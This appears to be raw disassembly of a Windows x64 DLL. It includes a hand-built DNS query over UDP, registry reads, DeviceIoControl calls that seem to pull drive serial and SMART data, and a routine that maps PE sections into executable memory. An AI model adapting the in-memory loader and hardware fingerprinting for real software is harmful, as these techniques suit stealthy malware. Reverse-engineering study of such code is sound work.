mov rsi [ rsp + 0x38 ]
mov [ rsp + 0x30 ] rbx
nop
mov ecx [ rdi ]
mov rbx [ rdi + 0x10 ]
call sub_18001c910
call [ GetProcessHeap@IAT ]
mov r8 rdi
mov rcx rax
xor edx edx
call [ HeapFree@IAT ]
mov rdi rbx
cmp rbx rsi
jne r-xdata
mov rbx [ rsp + 0x30 ]
sub_180019d00
push rbx
sub rsp 0x20
mov rbx rcx
test rcx rcx
je r-xdata
xor eax eax
add rsp 0x20
pop rbx
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rsp + 0x30 ] rsi
mov [ rsp + 0x38 ] rdi
mov [ rcx ] rax
mov [ rcx + 0x8 ] rax
mov [ rcx + 0x10 ] rax
mov [ rcx + 0x18 ] rax
lea rcx [ rw-data ]
xor edi edi
call [ EnterCriticalSection@IAT ]
mov rsi [ rw-data ]
lea rcx [ rw-data ]
cmp rsi rcx
jne r-xdata
mov rax [ rsi + 0x10 ]
mov edi 0x1
mov [ rax + 0x8 ] rcx
mov rdx [ rsi + 0x10 ]
mov [ rw-data ] rdx
mov edx [ rsi ]
mov [ rbx + 0x10 ] edx
call [ GetProcessHeap@IAT ]
mov r8 rsi
mov rcx rax
xor edx edx
call [ HeapFree@IAT ]
dec [ rw-data ]
lea rcx [ rbx + 0x10 ]
call sub_18001c8c0
test eax eax
jne r-xdata
lea rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
mov rsi [ rsp + 0x30 ]
mov eax edi
mov rdi [ rsp + 0x38 ]
add rsp 0x20
pop rbx
retn
lea edi [ rax + 0x1 ]
jmp r-xdata
sub_180019dd0
push rbx
sub rsp 0x20
cmp [ rw-data ] 0x0
mov ebx ecx
jne r-xdata
lea rcx [ rw-data ]
mov [ rsp + 0x30 ] rsi
mov [ rsp + 0x38 ] rdi
xor edi edi
call [ EnterCriticalSection@IAT ]
mov r11 [ rw-data ]
lea rsi [ rw-data ]
cmp r11 rsi
je r-xdata
xor eax eax
add rsp 0x20
pop rbx
retn
call [ GetProcessHeap@IAT ]
mov edx 0x8
lea r8d [ rdx + 0x10 ]
mov rcx rax
call [ HeapAlloc@IAT ]
mov r11 rax
test rax rax
je r-xdata
cmp ebx [ r11 ]
je r-xdata
lea rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
mov rsi [ rsp + 0x30 ]
mov eax edi
mov rdi [ rsp + 0x38 ]
add rsp 0x20
pop rbx
retn
mov rax [ rw-data ]
mov edi 0x1
mov [ rax + 0x10 ] r11
mov [ r11 + 0x8 ] rax
mov [ r11 + 0x10 ] rsi
mov [ rw-data ] r11
mov [ r11 ] ebx
inc [ rw-data ]
mov r11 [ r11 + 0x10 ]
cmp r11 rsi
jne r-xdata
sub_180019ea0
push rdi
sub rsp 0x50
mov [ rsp + 0x38 ] 0xfffffffffffffffe
mov [ rsp + 0x70 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x40 ] rax
mov edi edx
mov rdx rcx
test rcx rcx
je r-xdata
xor eax eax
cmp edi 0x1
jb r-xdata
mov rcx [ rw-data ]
cmp rcx 0xffffffffffffffff
jne r-xdata
xor ebx ebx
mov [ rsp + 0x30 ] ebx
mov [ rsp + 0x20 ] rbx
lea r9 [ rsp + 0x30 ]
mov r8d edi
call [ WriteFile@IAT ]
cmp [ rsp + 0x30 ] edi
sete bl
mov eax ebx
jmp r-xdata
mov [ rw-data ] rcx
jmp r-xdata
mov rcx [ rsp + 0x40 ]
xor rcx rsp
call sub_18000c060
mov rbx [ rsp + 0x70 ]
add rsp 0x50
pop rdi
retn
sub_180019f30
push rdi
sub rsp 0x50
mov [ rsp + 0x38 ] 0xfffffffffffffffe
mov [ rsp + 0x70 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x40 ] rax
mov edi edx
mov rdx rcx
test rcx rcx
je r-xdata
xor eax eax
cmp edi 0x1
jb r-xdata
mov rcx [ rw-data ]
cmp rcx 0xffffffffffffffff
jne r-xdata
xor ebx ebx
mov [ rsp + 0x30 ] ebx
mov [ rsp + 0x20 ] rbx
lea r9 [ rsp + 0x30 ]
mov r8d edi
call [ WriteFile@IAT ]
cmp [ rsp + 0x30 ] edi
sete bl
mov eax ebx
jmp r-xdata
mov [ rw-data ] rcx
jmp r-xdata
mov rcx [ rsp + 0x40 ]
xor rcx rsp
call sub_18000c060
mov rbx [ rsp + 0x70 ]
add rsp 0x50
pop rdi
retn
sub_180019fc0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
mov rdi rcx
xor ebx ebx
mov ecx 0x100
mov rsi r8
mov r13 rdx
mov [ r8 ] 0x1
mov ebp ebx
mov r12d ebx
call sub_18000c27c
mov [ rax ] bl
mov r11 rax
movzx eax [ rdi ]
test al al
je r-xdata
mov eax ebp
mov [ rax + r11 ] bl
cmp r12d 0x1
jne r-xdata
mov rdx r11
or rcx 0xffffffffffffffff
xor eax eax
mov rdi r11
[ rdi ]
mov rdx rbx
not rcx
dec rcx
test ecx ecx
jle r-xdata
inc [ rsi ]
mov [ rdx ] al
inc ebp
inc rdx
movzx ecx al
movzx eax [ rdi + 0x1 ]
mov r12d 0x1
shl ecx 0x8
lea ecx [ rcx + rax - 0xc000 ]
mov eax ecx
lea rdi [ rcx + r13 - 0x1 ]
jmp r-xdata
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
movsxd rax ebx
mov rbx [ rsp + 0x40 ]
mov [ rax + r11 - 0x1 ] 0x0
mov rax r11
add rsp 0x20
pop r13
pop r12
pop rdi
retn
nop [ rax + rax ] ax
movzx eax [ rdi ]
test al al
jne r-xdata
inc [ rsi ]
inc rdi
test r12d r12d
jne r-xdata
or rcx 0xffffffffffffffff
xor eax eax
mov [ rdx + r11 ] 0x2e
mov rdi r11
inc ebx
inc rdx
[ rdi ]
not rcx
dec rcx
cmp ebx ecx
jl r-xdata
lea rsi [ rdi + 0x1 ]
mov ecx eax
add ebx eax
[ rdi ] [ rsi ]
add rdx rax
cmp al 0xc0
jb r-xdata
movzx eax [ rdx + r11 ]
lea rdi [ rdx + r11 ]
test eax eax
jle r-xdata
sub_18001a0d0
mov [ rsp + 0x8 ] rdi
mov r8 rcx
or rcx 0xffffffffffffffff
xor eax eax
mov rdi rdx
xor r9d r9d
mov r11 rdx
[ rdi ]
movzx eax [ r--data ]
or rcx 0xffffffffffffffff
mov [ rdi - 0x1 ] ax
xor eax eax
mov rdi rdx
[ rdi ]
mov r10d r9d
not rcx
dec rcx
test ecx ecx
jle r-xdata
mov rdi [ rsp + 0x8 ]
mov [ r8 ] al
retn
nop [ rax ] eax
or rcx 0xffffffffffffffff
xor eax eax
mov rdi r11
[ rdi ]
inc r10d
not rcx
dec rcx
cmp r10d ecx
jl r-xdata
movzx eax r10b
inc r8
sub al r9b
mov [ r8 - 0x1 ] al
cmp r9d r10d
jge r-xdata
movsxd rax r10d
cmp [ rax + r11 ] 0x2e
jne r-xdata
inc r9d
movsxd rcx r9d
mov eax r10d
sub eax r9d
add rcx r11
mov edx eax
add r9d eax
nop
movzx eax [ rcx ]
inc r8
inc rcx
dec rdx
mov [ r8 - 0x1 ] al
jne r-xdata
sub_18001a180
push rbp
push rbx
push rsi
push rdi
push r13
push r14
push r15
lea rbp [ rsp - 0x101b0 ]
mov eax 0x102b0
call sub_18000d8d0
sub rsp rax
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x101a0 ] rax
mov esi 0x2
mov r14 r8
mov rdi rdx
mov rbx rcx
lea r8d [ rsi + 0xf ]
mov edx esi
mov ecx esi
call [ socket@IAT ]
lea ecx [ rsi + 0x33 ]
mov [ rsp + 0x38 ] si
mov r13 rax
call [ htons@IAT ]
mov rcx rdi
mov [ rsp + 0x3a ] ax
call [ inet_addr@IAT ]
mov [ rsp + 0x3c ] eax
call [ GetCurrentThreadId@IAT ]
mov ecx eax
call [ htons@IAT ]
movzx ecx [ rbp + 0x1a2 ]
and cl 0x1
mov [ rbp + 0x1a0 ] ax
xor al al
or cl 0x1
mov [ rbp + 0x1a3 ] al
mov [ rbp + 0x1a2 ] cl
lea ecx [ rsi - 0x1 ]
call [ htons@IAT ]
xor r15d r15d
lea r8d [ rsi + 0x61 ]
lea rcx [ rbp + 0x131 ]
xor edx edx
mov [ rbp + 0x1a6 ] r15d
mov [ rbp + 0x1a4 ] ax
mov [ rbp + 0x1aa ] r15w
mov [ rbp + 0x130 ] r15b
call sub_18000bd10
lea r8d [ rsi + 0x61 ]
lea rcx [ rbp + 0x130 ]
mov rdx rbx
call sub_18000be10
lea rdx [ rbp + 0x130 ]
lea rcx [ rbp + 0x1ac ]
call sub_18001a0d0
or rcx 0xffffffffffffffff
xor eax eax
lea rdi [ rbp + 0x1ac ]
[ rdi ]
not rcx
lea rdi [ rcx - 0x1 ]
lea ecx [ rsi - 0x1 ]
call [ htons@IAT ]
lea ecx [ rsi - 0x1 ]
mov [ rbp + rdi + 0x1ad ] ax
call [ htons@IAT ]
or rcx 0xffffffffffffffff
mov [ rbp + rdi + 0x1af ] ax
xor eax eax
lea rdi [ rbp + 0x1ac ]
[ rdi ]
lea rax [ rsp + 0x38 ]
lea rdx [ rbp + 0x1a0 ]
not rcx
xor r9d r9d
mov [ rsp + 0x28 ] 0x10
lea r8d [ rcx + 0x10 ]
mov rcx r13
mov [ rsp + 0x20 ] rax
call [ sendto@IAT ]
cmp eax 0xffffffff
jne r-xdata
lea rax [ rsp + 0x30 ]
lea rdx [ rbp + 0x1a0 ]
xor r9d r9d
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0x38 ]
mov r8d 0x10000
mov rcx r13
mov [ rsp + 0x30 ] 0x10
mov [ rsp + 0x20 ] rax
call [ recvfrom@IAT ]
cmp eax 0xffffffff
jne r-xdata
call [ WSAGetLastError@IAT ]
lea rcx [ r--data ]
mov edx eax
or rcx 0xffffffffffffffff
xor eax eax
lea rdi [ rbp + 0x1ac ]
[ rdi ]
mov [ rsp + 0x34 ] r15d
mov [ rsp + 0x30 ] r15d
not rcx
lea rsi [ rbp + rcx + 0x1b0 ]
movzx ecx [ rbp + 0x1a6 ]
call [ ntohs@IAT ]
movzx edx ax
mov eax [ rsp + 0x30 ]
cmp eax edx
jge r-xdata
call [ WSAGetLastError@IAT ]
lea rcx [ r--data ]
mov edx eax
jmp r-xdata
movzx ecx [ rbp + 0x1a6 ]
mov [ rsp + 0x30 ] r15d
call [ ntohs@IAT ]
movzx edx ax
mov eax [ rsp + 0x30 ]
cmp eax edx
jge r-xdata
mov [ rsp + 0x10308 ] r12
nop [ rax + rax ] ax
call sub_180013d5c
mov rcx r13
call [ closesocket@IAT ]
nop [ rax + rax ] ax
lea r8 [ rsp + 0x34 ]
lea rdx [ rbp + 0x1a0 ]
mov rcx rsi
call sub_180019fc0
movsxd rdi [ rsp + 0x30 ]
lea rdx [ rdi + rdi * 2 ]
mov [ rsp + rdx * 8 + 0x60 ] rax
movsxd rax [ rsp + 0x34 ]
add rsi rax
movsxd rcx [ rsp + 0x30 ]
lea rdi [ rcx + rcx * 2 ]
lea rcx [ rcx + rcx * 2 ]
mov rax [ rsp + rcx * 8 + 0x58 ]
movzx ecx [ rax + 0x8 ]
call [ ntohs@IAT ]
movzx ecx ax
call sub_18000c27c
mov r12d r15d
mov rbx r15
mov [ rsp + rdi * 8 + 0x60 ] rax
mov rax [ rsp + rdi * 8 + 0x58 ]
movzx ecx [ rax + 0x8 ]
call [ ntohs@IAT ]
cmp r15w ax
jae r-xdata
movsxd rax [ rsp + 0x30 ]
lea rdx [ rax + rax * 2 ]
mov rax [ rsp + rdx * 8 + 0x60 ]
mov ecx [ rax ]
call [ inet_ntoa@IAT ]
lea rdx [ r--data ]
mov rcx r14
mov r8 rax
call sub_18000c0dc
jmp r-xdata
movzx ecx [ rbp + 0x1a6 ]
inc [ rsp + 0x30 ]
call [ ntohs@IAT ]
movzx edx ax
mov eax [ rsp + 0x30 ]
cmp eax edx
jl r-xdata
cdqe
lea r8 [ rsp + 0x34 ]
lea rdx [ rbp + 0x1a0 ]
mov rcx rsi
lea rdi [ rax + rax * 2 ]
call sub_180019fc0
mov [ rsp + rdi * 8 + 0x50 ] rax
movsxd rax [ rsp + 0x34 ]
add rsi rax
mov [ rsp + rdi * 8 + 0x58 ] rsi
mov rax [ rsp + rdi * 8 + 0x58 ]
add rsi 0xa
movzx ecx [ rax ]
call [ ntohs@IAT ]
cmp ax 0x1
jne r-xdata
mov r12 [ rsp + 0x10308 ]
movsxd rax [ rsp + 0x30 ]
lea rcx [ rax + rax * 2 ]
mov rax [ rsp + rcx * 8 + 0x58 ]
movzx ecx [ rax + 0x8 ]
call [ ntohs@IAT ]
movzx edx ax
movsxd rax [ rsp + 0x30 ]
lea rcx [ rax + rax * 2 ]
mov rax [ rsp + rcx * 8 + 0x60 ]
mov [ rdx + rax ] r15b
movsxd rax [ rsp + 0x30 ]
lea rcx [ rax + rax * 2 ]
mov rax [ rsp + rcx * 8 + 0x58 ]
movzx ecx [ rax + 0x8 ]
call [ ntohs@IAT ]
mov edi [ rsp + 0x30 ]
movzx edx ax
add rsi rdx
jmp r-xdata
nop [ rax ] eax
mov rcx [ rbp + 0x101a0 ]
xor rcx rsp
call sub_18000c060
add rsp 0x102b0
pop r15
pop r14
pop r13
pop rdi
pop rsi
pop rbx
pop rbp
retn
cdqe
lea rcx [ rax + rax * 2 ]
mov rax [ rsp + rcx * 8 + 0x58 ]
movzx ecx [ rax ]
call [ ntohs@IAT ]
cmp ax 0x1
je r-xdata
jmp r-xdata
movzx ecx [ rbp + 0x1a6 ]
inc edi
mov [ rsp + 0x30 ] edi
call [ ntohs@IAT ]
movzx edx ax
mov eax [ rsp + 0x30 ]
cmp eax edx
jl r-xdata
movsxd rax [ rsp + 0x30 ]
inc r12d
inc rbx
lea rcx [ rax + rax * 2 ]
movzx eax [ rbx + rsi - 0x1 ]
mov rdx [ rsp + rcx * 8 + 0x60 ]
mov [ rbx + rdx - 0x1 ] al
movsxd rax [ rsp + 0x30 ]
lea rcx [ rax + rax * 2 ]
mov rax [ rsp + rcx * 8 + 0x58 ]
movzx ecx [ rax + 0x8 ]
call [ ntohs@IAT ]
movzx edx ax
cmp r12d edx
jl r-xdata
sub_18001a5e0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x40
mov rbx rdx
mov rdi rcx
lea r8 [ rsp + 0x38 ]
lea rdx [ r--data ]
mov rcx 0xffffffff80000001
mov [ rsp + 0x38 ] 0x0
call [ RegCreateKeyA@IAT ]
test eax eax
jne r-xdata
xor eax eax
mov rbx [ rsp + 0x50 ]
add rsp 0x40
pop rdi
retn
mov rcx [ rsp + 0x38 ]
mov [ rsp + 0x30 ] eax
lea rax [ rsp + 0x60 ]
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0x30 ]
lea r9 [ rsp + 0x68 ]
lea rdx [ r--data ]
xor r8d r8d
mov [ rsp + 0x68 ] 0x4
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x60 ] 0x4
call [ RegQueryValueExA@IAT ]
cmp [ rsp + 0x30 ] 0x0
jne r-xdata
mov ecx [ rbx ]
lea r9 [ rsp + 0x68 ]
lea rdx [ r--data ]
mov [ rsp + 0x60 ] ecx
lea rcx [ rsp + 0x60 ]
xor r8d r8d
mov [ rsp + 0x28 ] rcx
mov rcx [ rsp + 0x38 ]
mov [ rsp + 0x68 ] 0x1
mov [ rsp + 0x20 ] rdi
call [ RegQueryValueExA@IAT ]
mov r11d [ rsp + 0x60 ]
mov rcx [ rsp + 0x38 ]
mov [ rbx ] r11d
call [ RegCloseKey@IAT ]
mov rbx [ rsp + 0x50 ]
mov eax 0x1
add rsp 0x40
pop rdi
retn
mov rcx [ rsp + 0x38 ]
call [ RegCloseKey@IAT ]
sub_18001a6e0
sub rsp 0x8
movzx ecx [ rdx + 0x28 ]
xor eax eax
nop [ rax + rax ] ax
add rsp 0x8
retn
inc eax
cmp eax 0x14
jl r-xdata
cmp cl 0x80
jae r-xdata
or rcx 0xffffffffffffffff
mov [ rsp ] rdi
xor eax eax
lea rdi [ rw-data ]
[ rdi ]
not rcx
dec rcx
je r-xdata
mov eax [ rdx + 0x28 ]
shr eax 0x8
mov [ rw-data ] al
movzx eax [ rdx + 0x28 ]
mov [ rw-data ] al
mov eax [ rdx + 0x2c ]
shr eax 0x8
mov [ rw-data ] al
movzx eax [ rdx + 0x2c ]
mov [ rw-data ] al
mov eax [ rdx + 0x30 ]
shr eax 0x8
mov [ rw-data ] al
movzx eax [ rdx + 0x30 ]
mov [ rw-data ] al
mov eax [ rdx + 0x34 ]
shr eax 0x8
mov [ rw-data ] al
movzx eax [ rdx + 0x34 ]
mov [ rw-data ] al
mov eax [ rdx + 0x38 ]
shr eax 0x8
mov [ rw-data ] al
movzx eax [ rdx + 0x38 ]
mov [ rw-data ] al
mov eax [ rdx + 0x3c ]
shr eax 0x8
mov [ rw-data ] al
movzx eax [ rdx + 0x3c ]
mov [ rw-data ] al
mov eax [ rdx + 0x40 ]
shr eax 0x8
mov [ rw-data ] al
movzx eax [ rdx + 0x40 ]
mov [ rw-data ] al
mov eax [ rdx + 0x44 ]
shr eax 0x8
mov [ rw-data ] al
movzx eax [ rdx + 0x44 ]
mov [ rw-data ] al
mov eax [ rdx + 0x48 ]
shr eax 0x8
mov [ rw-data ] al
movzx eax [ rdx + 0x48 ]
mov [ rw-data ] al
mov eax [ rdx + 0x4c ]
shr eax 0x8
mov [ rw-data ] al
movzx eax [ rdx + 0x4c ]
mov [ rw-data ] 0x0
mov [ rw-data ] al
mov eax 0x13
lea rdx [ rw-data ]
nop [ rax ] eax
lea rdi [ rw-data ]
or rcx 0xffffffffffffffff
[ rdi ]
movzx eax [ r--data ]
mov [ rdi - 0x1 ] ax
movzx eax [ r--data ]
mov [ rdi + 0x1 ] al
xor eax eax
or rcx 0xffffffffffffffff
lea rdi [ rw-data ]
[ rdi ]
xor ecx ecx
nop [ rax + rax ] ax
mov [ rax + rdx ] 0x0
dec rax
test rax rax
jg r-xdata
movzx eax [ rdx + rcx ]
inc rcx
mov [ rdi + rcx - 0x2 ] al
test al al
jne r-xdata
mov rdi [ rsp ]
cmp [ rax + rdx ] 0x20
jne r-xdata
sub_18001a880
mov r11 rsp
mov [ r11 + 0x10 ] rbx
mov [ r11 + 0x18 ] rdi
push rbp
push r12
push r13
push r14
push r15
lea rbp [ r11 - 0x4c8 ]
sub rsp 0x5a0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x490 ] rax
xor r14d r14d
lea r15 [ rw-data ]
lea r13 [ rw-data ]
mov r12d r14d
mov ebx r14d
mov [ r11 + 0x8 ] rsi
nop
inc ebx
cmp ebx 0x4
jl r-xdata
xor eax eax
mov [ rsp + 0x38 ] r14
xor r9d r9d
mov [ rsp + 0x70 ] rax
mov [ rsp + 0x78 ] rax
mov [ rbp - 0x80 ] rax
lea rax [ rsp + 0x40 ]
xor r8d r8d
mov edx 0x74080
mov [ rsp + 0x30 ] rax
lea rax [ rsp + 0x70 ]
mov rcx rdi
mov [ rsp + 0x28 ] 0x18
mov [ rsp + 0x40 ] r14d
mov [ rsp + 0x20 ] rax
call [ DeviceIoControl@IAT ]
movzx esi [ rsp + 0x73 ]
test sil sil
je r-xdata
lea rcx [ rbp + 0x391 ]
xor edx edx
mov r8d 0xff
mov [ rbp + 0x390 ] r14b
call sub_18000bd10
lea r8 [ r--data ]
lea rcx [ rbp + 0x390 ]
mov r9d ebx
mov edx 0xff
call sub_18000cac8
xor r9d r9d
mov [ rsp + 0x30 ] r14
lea rcx [ rbp + 0x390 ]
lea r8d [ r9 + 0x3 ]
mov edx 0xc0000000
mov [ rsp + 0x28 ] r14d
mov [ rsp + 0x20 ] 0x3
call [ CreateFileA@IAT ]
mov rdi rax
cmp rax 0xffffffffffffffff
je r-xdata
mov eax r12d
mov rsi [ rsp + 0x5d0 ]
mov rcx [ rbp + 0x490 ]
xor rcx rsp
call sub_18000c060
lea r11 [ rsp + 0x5a0 ]
mov rbx [ r11 + 0x38 ]
mov rdi [ r11 + 0x40 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov rcx rdi
call [ CloseHandle@IAT ]
xor eax eax
lea rcx [ rw-data ]
xor edx edx
mov r8d 0x210
mov [ rsp + 0x48 ] rax
mov [ rsp + 0x50 ] rax
mov [ rsp + 0x58 ] rax
mov [ rsp + 0x60 ] rax
mov [ rsp + 0x68 ] al
call sub_18000bd10
movzx eax bl
movzx ecx bl
and al 0x1
shr sil cl
mov [ rsp + 0x38 ] r14
or al 0xfa
mov ecx 0xa1
lea r8 [ rsp + 0x48 ]
shl al 0x4
test sil 0x10
mov r9d 0x20
mov [ rsp + 0x51 ] al
mov eax 0xec
mov edx 0x7c088
cmovne eax ecx
mov rcx rdi
mov [ rsp + 0x4c ] 0x10100
mov [ rsp + 0x52 ] al
lea rax [ rsp + 0x40 ]
mov [ rsp + 0x50 ] r14b
mov [ rsp + 0x30 ] rax
lea rax [ rw-data ]
mov [ rsp + 0x28 ] 0x210
mov [ rsp + 0x54 ] bl
mov [ rsp + 0x48 ] 0x200
mov [ rsp + 0x20 ] rax
call [ DeviceIoControl@IAT ]
test eax eax
je r-xdata
lea rdx [ rbp - 0x6c ]
mov rcx r15
nop [ rax ] eax
movzx eax [ rcx ]
add rcx 0x4
add rdx 0x8
mov [ rdx - 0xc ] eax
movzx eax [ rcx - 0x2 ]
mov [ rdx - 0x8 ] eax
cmp rcx r13
jl r-xdata
lea rdx [ rbp - 0x70 ]
mov ecx ebx
call sub_18001a6e0
mov r12d 0x1
sub_18001aad0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x790
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x780 ] rax
xor r13d r13d
mov edi r13d
mov r12d r13d
mov esi r13d
nop [ rax ] eax
add esi 0x2
inc r12d
cmp esi 0x4
jl r-xdata
mov ebx r13d
nop [ rax + rax ] ax
lea rcx [ rsp + 0x681 ]
xor edx edx
mov r8d 0xff
mov [ rsp + 0x680 ] r13b
call sub_18000bd10
lea r8 [ r--data ]
lea rcx [ rsp + 0x680 ]
mov r9d r12d
mov edx 0xff
call sub_18000cac8
xor r9d r9d
mov [ rsp + 0x30 ] r13
lea rcx [ rsp + 0x680 ]
lea r8d [ r9 + 0x3 ]
mov edx 0xc0000000
mov [ rsp + 0x28 ] r13d
mov [ rsp + 0x20 ] 0x3
call [ CreateFileA@IAT ]
mov rbp rax
cmp rax 0xffffffffffffffff
je r-xdata
mov eax edi
mov rcx [ rsp + 0x780 ]
xor rcx rsp
call sub_18000c060
lea r11 [ rsp + 0x790 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rsi [ r11 + 0x30 ]
mov rsp r11
pop r13
pop r12
pop rdi
retn
inc ebx
cmp ebx 0x2
jl r-xdata
cmp [ rsp + 0x4b2 ] r13b
je r-xdata
lea rcx [ rsp + 0x450 ]
xor edx edx
mov r8d 0x22d
call sub_18000bd10
lea rdx [ r--data ]
lea rcx [ rsp + 0x454 ]
mov r8d 0x8
mov [ rsp + 0x450 ] 0x1c
mov [ rsp + 0x45c ] 0x2710
mov [ rsp + 0x468 ] 0x211
mov [ rsp + 0x460 ] 0x1b0501
call sub_18000be10
mov [ rsp + 0x38 ] r13
lea rax [ rsp + 0x40 ]
lea r8 [ rsp + 0x450 ]
mov [ rsp + 0x30 ] rax
lea rax [ rsp + 0x450 ]
mov r9d 0x3c
mov edx 0x4d008
mov rcx rbp
mov [ rsp + 0x28 ] 0x22d
mov [ rsp + 0x476 ] 0xec
mov [ rsp + 0x478 ] bl
mov [ rsp + 0x20 ] rax
call [ DeviceIoControl@IAT ]
test eax eax
je r-xdata
mov rcx rbp
call [ CloseHandle@IAT ]
mov rcx r13
nop [ rax + rax ] eax
movzx eax [ rsp + rcx * 2 + 0x47c ]
add rcx 0x2
mov [ rsp + rcx * 4 + 0x48 ] eax
movzx eax [ rsp + rcx * 2 + 0x47a ]
mov [ rsp + rcx * 4 + 0x4c ] eax
cmp rcx 0x100
jl r-xdata
lea ecx [ rsi + rbx ]
lea rdx [ rsp + 0x50 ]
call sub_18001a6e0
mov edi 0x1
sub_18001ace0
sub rsp 0x28
mov [ rw-data ] 0x0
call sub_18001a880
test eax eax
jne r-xdata
lea rax [ rw-data ]
add rsp 0x28
retn
call sub_18001aad0
movzx ecx [ rw-data ]
xor edx edx
test eax eax
cmove ecx edx
mov [ rw-data ] cl
sub_18001ad20
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov edi edx
mov rbx rcx
test edx edx
je r-xdata
xor al al
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov eax [ rcx + 0x10 ]
test eax eax
je r-xdata
cmp [ rcx ] 0x0
jne r-xdata
imul eax edi
mov [ rsp + 0x30 ] rsi
mov r9d 0x4
movsxd rsi eax
mov r8d 0x1000
xor ecx ecx
mov rdx rsi
call [ VirtualAlloc@IAT ]
mov [ rbx ] rax
test rax rax
jne r-xdata
mov r8 rsi
xor edx edx
mov rcx rax
mov [ rbx + 0xc ] 0x0
mov [ rbx + 0x8 ] edi
call sub_18000bd10
mov rsi [ rsp + 0x30 ]
mov al 0x1
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rsi [ rsp + 0x30 ]
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_18001adb0
mov [ rsp + 0x20 ] rbp
push r12
sub rsp 0x20
cmp [ rcx ] 0x0
mov r12 rdx
mov rbp rcx
je r-xdata
mov rbp [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
mov r8d [ rcx + 0x8 ]
cmp r8d [ rcx + 0xc ]
jne r-xdata
movsxd rcx [ rbp + 0x10 ]
mov eax [ rbp + 0xc ]
mov rdx r12
mov r8 rcx
imul eax ecx
movsxd rcx eax
add rcx [ rbp ]
call sub_18000c440
inc [ rbp + 0xc ]
add r8d r8d
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] rsi
mov [ rcx + 0x8 ] r8d
mov [ rsp + 0x40 ] rdi
mov edi [ rcx + 0x10 ]
mov r9d 0x4
xor ecx ecx
imul edi r8d
movsxd rbx edi
mov r8d 0x1000
mov rdx rbx
call [ VirtualAlloc@IAT ]
mov r8 rbx
xor edx edx
mov rcx rax
mov rsi rax
call sub_18000bd10
mov eax edi
mov rcx rsi
cdq
sub eax edx
mov rdx [ rbp ]
sar eax 0x1
movsxd r8 eax
call sub_18000c440
mov rcx [ rbp ]
xor edx edx
mov r8d 0x8000
call [ VirtualFree@IAT ]
mov rdi [ rsp + 0x40 ]
mov rbx [ rsp + 0x30 ]
mov [ rbp ] rsi
mov rsi [ rsp + 0x38 ]
sub_18001ae90
test edx edx
js r-xdata
retn
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x20
mov esi r8d
mov ebx edx
mov rdi rcx
test r8d r8d
jle r-xdata
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop rdi
mov ecx [ rcx + 0xc ]
lea eax [ rdx + 0x1 ]
cmp eax ecx
jg r-xdata
lea eax [ rdx + r8 ]
cmp eax ecx
jg r-xdata
mov rdx [ rdi ]
test rdx rdx
je r-xdata
mov ecx [ rdi + 0x10 ]
mov [ rsp + 0x30 ] rbp
mov [ rsp + 0x38 ] r12
mov eax ecx
imul ecx esi
imul eax ebx
movsxd r8 ecx
movsxd rbp eax
add rbp rdx
lea r12 [ r8 + rbp ]
test rbp rbp
je r-xdata
mov rbp [ rsp + 0x30 ]
mov r12 [ rsp + 0x38 ]
test r12 r12
je r-xdata
xor edx edx
mov rcx rbp
call sub_18000bd10
mov r11d [ rdi + 0xc ]
mov rdx r12
sub r11d ebx
mov rcx rbp
sub r11d esi
imul r11d [ rdi + 0x10 ]
movsxd rbx r11d
mov r8 rbx
call sub_18000c440
mov r11d esi
lea rcx [ rbx + rbp ]
imul r11d [ rdi + 0x10 ]
xor edx edx
movsxd r8 r11d
call sub_18000bd10
sub [ rdi + 0xc ] esi
sub_18001afa0
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push r12
push r13
push r14
sub rsp 0x20
mov rax [ r8 ]
mov r14 [ r8 + 0x8 ]
xor esi esi
mov rbp r8
movzx r8d [ rax + 0x14 ]
mov r12 rdx
mov r13 rcx
cmp si [ rax + 0x6 ]
jae r-xdata
mov rbp [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
mov [ rsp + 0x48 ] rdi
lea rdi [ r8 + rax + 0x28 ]
mov [ rsp + 0x40 ] rbx
mov ecx [ rdi - 0x4 ]
mov rdx rax
mov r9d 0x40
add rcx r14
mov r8d 0x1000
call [ VirtualAlloc@IAT ]
mov rbx rax
test rax rax
jne r-xdata
movsxd rax [ r12 + 0x38 ]
test eax eax
jle r-xdata
mov edx [ rdi + 0x4 ]
mov r8d [ rdi ]
mov rcx rbx
add rdx r13
call sub_18000c440
mov [ rdi - 0x8 ] ebx
call [ GetLastError@IAT ]
mov rax [ rbp ]
inc esi
add rdi 0x28
movzx ecx [ rax + 0x6 ]
cmp esi ecx
jl r-xdata
mov ecx [ rdi - 0x4 ]
mov r9d 0x40
mov r8d 0x1000
mov rdx rax
add rcx r14
mov rbx rax
call [ VirtualAlloc@IAT ]
